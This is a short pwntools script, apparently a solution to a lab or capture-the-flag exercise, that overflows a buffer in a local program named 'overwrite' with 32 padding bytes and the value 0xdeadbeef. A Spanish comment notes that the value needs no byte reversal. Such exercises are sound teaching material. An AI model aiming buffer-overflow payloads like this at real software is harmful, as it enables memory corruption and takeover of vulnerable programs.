#!/bin/python3
from pwn import *

# Start program
io = process('./overwrite')

# Send string to overflow buffer
io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))   #No hace falta invertirlo

# Receive output
print(io.recvall().decode())
